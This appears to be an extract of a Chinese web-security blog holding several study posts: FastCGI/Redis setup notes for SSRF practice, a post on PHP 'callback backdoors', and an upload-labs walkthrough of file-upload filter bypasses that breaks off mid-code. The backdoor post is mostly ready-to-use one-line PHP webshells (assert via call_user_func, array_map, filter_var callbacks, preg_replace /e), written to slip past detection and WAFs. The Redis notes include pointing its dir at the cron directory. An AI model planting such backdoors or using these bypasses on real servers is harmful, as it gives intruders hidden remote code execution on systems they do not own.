进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI 此时是常驻在内存中，不会每次请求重新启动。 在接触不到服务器文件的情况下，我们可以通过phpinfo()中的Server API来判断PHP的连接方式： 对于FastCGI协议的具体分析参考P牛的博客：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html PHP-FPM 基本概念 官方定义如下： FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。 简单地说，FPM是实现和管理FastCGI进程的管理器，能够接收服务器中间件发送的FastCGI协议包并进行解析、最后将解析结果返回给服务器中间件。 这里借用先知的一个图来看看就清楚了： 通信方式 在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种： TCP模式 TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。 通常我们可以通过查看Nginx的配置文件default.conf来确认是否是TCP模式，这里个人环境中的路径为/etc/nginx/conf.d/default.conf，关注fastcgi_pass这一项，若为ip+port的形式即为TCP模式： 12345678location ~ \\.php$ &#123; index index.php index.html index.htm; include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; &#125; 在PHP-FPM中，可以通过查看其配置文件，个人环境中的路径为/etc/php/7.2/fpm/pool.d/www.conf，看到listen一项若为ip+port的形式即为TCP模式： 1234567891011; The address on which to accept FastCGI requests.; Valid syntaxes are:; &#39;ip.add.re.ss:port&#39; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &#39;port&#39; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39; - to listen on a unix socket.; Note: This value is mandatory.listen &#x3D; 127.0.0.1:9000 Unix Socket模式 Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。 相比之下，Unix套接字模式的性能会优于TCP模式。 还是一样的识别方法，在Nginx的default.conf中查看fastcgi_pass： 12345678location~\\.php$&#123; index index.php index.html index.htm; include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params; fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; include fastcgi_params;&#125; 在PHP-FPM的www.conf中查看listen： 12listen &#x3D; &#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock Appendix B Redis 环境搭建 目标机上安装redis服务：apt-get install redis 如果要使外网访问： 更改/etc/redis/redis.conf配置： 123456789# 取消绑定IP# bind 127.0.0.1# 允许后台运行daemonize yes# 取消保护模式protected-mode no 更改防火墙配置： Ubuntu18.04： 12ufw allow 6379 Centos7： 123456789101112# 列出所有开放端口firewall-cmd --list-all# 将6397端口加入防火墙firewall-cmd --zone=public --add-port=6397/tcp# 重启防火墙服务firewall-cmd --reload# 查看是否生效firewall-cmd --zone=public --query-port=6397/tcp 重启redis服务： 12systemctl restart redis 测试远程是否能够访问： 查看端口是否开放： 12345678910root@ca01h:~# nmap 47.97.199.89 -p 6379Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 12:55 HKTNmap scan report for 47.97.199.89Host is up (0.0098s latency).PORT STATE SERVICE6379/tcp open redisNmap done: 1 IP address (1 host up) scanned in 0.31 seconds 查看是否能远程连接目标服务器的redis服务： 1234root@ca01h:~# redis-cli -h 47.97.199.89 -p 637947.97.199.89:6379 &gt; info&gt; (返回redis基本信息) 配置完成。 PHP-FPM 环境搭建 https://xz.aliyun.com/t/5598#toc-2 Nginx+PHP-FPM 502错误排查 https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/、 更改Redis的dir属性显示权限不足 运行命令： 1234[root@ca0y1h-centos ~]# redis-cli 127.0.0.1:6379&gt; config set dir /var/spool/cron/(error) ERR Changing directory: Permission denied 此时redis服务是以非root身份启动： 123[root@ca0y1h-centos ~]# ps aux |grep redisredis 3849 0.0 0.3 142960 5804 ? Ssl 13:24 0:00 /usr/bin/redis-server *:6379 解决办法： 可以以root用户使用redis-server命令启动redis服务： 123456[root@ca0y1h-centos ~]# redis-server &#x2F;etc&#x2F;redis.conf[root@ca0y1h-centos ~]# ps aux | grep redisroot 3856 0.0 0.2 22132 5168 pts&#x2F;1 S+ 13:24 0:00 redis-cliroot 4245 0.0 0.2 142960 5312 ? Ssl 13:28 0:00 redis-server *:6379 Reference https://joychou.org/web/phpssrf.html#directory0470238852615231466 https://www.evi1.cn/post/ssrf/ https://paper.seebug.org/409/ https://www.freebuf.com/articles/web/135342.html","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"ssrf","slug":"ssrf","permalink":"http://ca0y1h.top/tags/ssrf/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之回调后门","date":"2019-12-03T04:55:46.000Z","path":"Web_security/php_related/1.PHP回调后门/","text":"Web安全学习之PHP回调后门 在做一道CTF渗透类型的题目时，做到最后一步看到了array_walk()函数，于是直接Google这个函数漏洞，果然存在着回调后门（貌似是P牛起的这个名字），在此延申一下知识点做一个记录。 什么是回调函数 回调函数就是将一个函数作为参数传入另一个函数的函数。php中有许多这样的函数，比如call_user_func , call_user_func_array,array_map等等，这些函数可以将函数作为参数执行后返回主函数，方便使用，但是既然可以将函数作为参数传入执行，如果将一些危险的函数作为参数传入，那就有可能成为一个可利用且不易检测的后门。 传统的回调后门 call_user_func()在PHP中是回调的标准的函数，第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数，返回值为回调函数的结果。 1call_user_func(&#x27;assert&#x27;, $_REQUEST[&quot;pass&quot;]); assert()函数直接作为回调函数，然后$_REQUEST[&quot;pass&quot;]作为assert参数调用。 另外，PHP还提供另外一个相似的函数call_user_func_array()： 1call_user_func_array(&#x27;assert&#x27;, array($_REQUEST[&#x27;pass&#x27;])); call_user_func_array函数，和call_user_func类似，只是第二个参数可以传入参数列表组成的数组。 单个参数回调后门 注意：这里的单个参数指的是回调函数的参数个数 其实，在PHP中还有很多回调函数，这些含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。 例如array_filter()函数： array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) 依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。 123$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;],);array_filter($arr, base64_decode($e)); array_filter函数是将数组中所有元素遍历并用指定函数处理过滤用的，arr数组中的每个元素都会作为base64解码后函数e的参数。如下图： 类似array_filter，array_map也有相同的功效： 123$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;],);array_map(base64_decode($e), $arr); 单参数后门的终极奥义： 123&lt;?php$e = $_REQUEST[&#x27;e&#x27;];register_shutdown_function($e, $_REQUEST[&#x27;pass&#x27;]); 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];declare(ticks=1);register_tick_function ($e, $_REQUEST[&#x27;pass&#x27;]); 123&lt;?phpfilter_var($_REQUEST[&#x27;pass&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));filter_var_array(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;))); 最后一个是filter_var的利用，PHP里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。 两个参数回调后门 在PHP5.4.8+版本中，assert有一个新的可选参数descrition。 具体函数定义如下： assert ( mixed $assertion [, string $description ] ) : bool 所以较于之前的PHP版本，我们可以使用一些新的方式去进行调用： 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);uasort($arr, base64_decode($e)); 注意：$arr数组中的元素都是回调函数$e的参数！ 在PHP5.4.8以上版本可以正常执行： 还有一些类似的函数，比如说uksort()： 具体函数定义如下： uksort ( array &amp;$array , callable $key_compare_func ) : bool 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);uksort($arr, base64_decode($e)); 以及面向对象的方法： 12345678&lt;?php// way 0$arr = new ArrayObject(array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]));$arr-&gt;uasort(&#x27;assert&#x27;);// way 1$arr = new ArrayObject(array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2));$arr-&gt;uksort(&#x27;assert&#x27;); 再比如array_reduce()： PHP 4 &gt;= 4.0.5, PHP 5, PHP 7) array_reduce — 用回调函数迭代地将数组简化为单一的值 1array_reduce($arr = array(&#x27;&#x27;), base64_decode($_REQUEST[&#x27;e&#x27;]), $_REQUEST[&#x27;a&#x27;]); array_udiff()函数 (PHP 5, PHP 7) array_udiff — 用回调函数比较数据来计算数组的差集 1array_udiff($arr = array($_REQUEST[&#x27;a&#x27;]), $arr1 = array(&#x27;&#x27;), base64_decode($_REQUEST[&#x27;e&#x27;])); 三个参数回调后门 有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数，比如array_walk()。 函数定义：array_walk ( array &amp;$array , callable$callback [, mixed $userdata = NULL ] ) : bool 它的参数解释： 三个参数可以用preg_replace()。 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);array_walk($arr, $e, &#x27;&#x27;); 执行效果如下图： 需要对这段代码做出一定的解释： preg_replace 函数是用来执行一个正则表达式的搜索和替换，它的函数定义如下： preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 根据array_walk()参数解释可以得出，array_walk($arr, $e, '');等价于： 1preg_replace(&#x27;|.*|e&#x27;, &#x27;phpinfo()&#x27;, &#x27;&#x27;); 第一个参数|.*|e表示的是\\e模式匹配，即会把replacement参数当作PHP语句来执行，.*是贪婪匹配。 除了array_walk()，还可以使用array_walk_recurcive()，参数的位置都是一样的： 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);array_walk_recursive($arr, $e, &#x27;&#x27;); 看了以上几个回调后门，发现preg_replace()确实好用。但显然很多WAF都会对其有所防备。其实PHP里不止这个函数可以执行eval的功能，还有几个类似的： 12&lt;?phpmb_ereg_replace(&#x27;.*&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;, &#x27;e&#x27;); 另外一个： 12&lt;?phpecho preg_filter(&#x27;|.*|e&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;); Reference 创造tips的秘籍——PHP回调后门","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"回调后门","slug":"回调后门","permalink":"http://ca0y1h.top/tags/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之文件上传漏洞利用","date":"2019-12-03T04:36:13.000Z","path":"Web_security/basic_learning/16.文件上传漏洞利用/","text":"Web安全学习之文件上传漏洞利用 在现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在上传文件漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限。 文件上传漏洞介绍 在一般情况下，文件上传漏洞一般都是指“上传Web脚本能够被服务器解析”的问题。要完成这个攻击，需要满足如下几个条件： 上传的文件后所在的目录要是Web容易能够覆盖到的路径，可以被Web容器解释执行。 用户能够从Web上访问到这个文件。 用户上传的文件不会被安全检查、格式化、图片压缩等功能改变了内容。 文件上传漏洞利用 本文结合upload-labs来对此种漏洞在PHP中的表现做一讲解。 Pass-01 前端JS检验绕过 代码 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 这是一个前端验证的上传点，针对这种情况我们一般有以下3种绕过方法。 绕过方式 禁用JS代码 Chrome浏览器在控制台的设置中可以直接禁用JS代码。 删除上传按钮的onsubmit属性 Burp修改后缀 先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。 Pass-02 MIME类型绕过 代码 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 白名单的方式检查Content-Type，使用MIME绕过。 绕过方式 MIME 在客户端上传文件时，通过Burp抓取数据包，当上传一个php格式的文件时，可以看到数据包中的Content-Type的值时application/ostet-stream，而上传jpg格式的文件时，数据包中Content-Type的值是image/jpeg。 上传php格式文件： 上传jpg格式文件： 所以对于这种情况，我们只需要使用burp抓包并修改Content-Type字段的内容即可。 Pass-03 利用特殊后缀名绕过 代码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 仅仅过滤了.asp、.aspx、.php、.jsp后缀文件，可以更改httpd.conf使得可以解析.php2类似的后缀文件。 绕过方式 httpd.conf配置文件 上传一个php文件后，提示不允许上传.asp,.aspx,.php,.jsp后缀文件！ 模拟一下真实操作，F12查看Response Header，服务器端是Apache+PHP 5.2.17，使用黑名单的方式过滤了 .asp,.aspx,.php,.jsp文件后缀。但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果配置有如下代码，则能够解析php、php3和phtml。 1AddType application&#x2F;x-httpd-php .php .php3 .phtml 所以我们这时只需要将文件名修改为.php3就可以成功上传shell。 解析顺序 在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。 Pass-04 利用.htaccess绕过 代码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传!&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 黑名单过滤了一大堆文件名，考虑上传.htaccess文件使得Apache可以将jpg文件解析成php文件。 绕过方式 解析顺序 同Pass-03 .htaccess文件 什么是.htaccess？ .htaccess是一个纯文本文件，里面存放Apache服务器配置相关指令； .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等； .htaccess的用途范围主要针对当前目录。 我们可以上传一个.htaccess文件，使得Apache可以将jpg文件解析成php文件，但要注意并不是任何时候都可以上传一个有效的.htaccess文件，在让.htaccess生效之前还需要对httpd.conf文件进行配置： 修改httpd.conf，启用AllowOverride： 1AllowOverride All 修改httpd.conf，增加如下语句： 1LoadModule rewrite_module modules&#x2F;mod_rewrite.so .htaccess文件： 1AddType application&#x2F;x-httpd-php .jpg 再上传.htaccess文件，这样Apache就可以将jpg文件解析成php文件。 Pass-05 利用后缀名大小写绕过 代码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; 绕过方式 解析顺序 分析代码，我们可以看到这句$file_ext = strrchr($file_name, '.');中的strrchr()函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。所以和Pass-03相似：当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。 大小写绕过 可以直接将文件改为.PHP后缀，Apache照样成功解析。 Pass-06 利用空格绕过 代码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方式 相比前几题，大小写绕过和上传.htaccess文件已经行不通了，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。 Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。 在此处代码过滤了.和::$DATA，但是没有去掉末尾的空格，因此上传一个.php[空格]文件即可。 空格绕过 修改文件后缀为1.php .这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和达到上传.php的目的。 Pass-07 利用.绕过 代码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方式 点绕过 从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。 用burp将上传文件后缀改为.php.即可，详细原理与Pass-06类似。 Pass-08 利用$DATA::绕过（Windows环境） 代码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 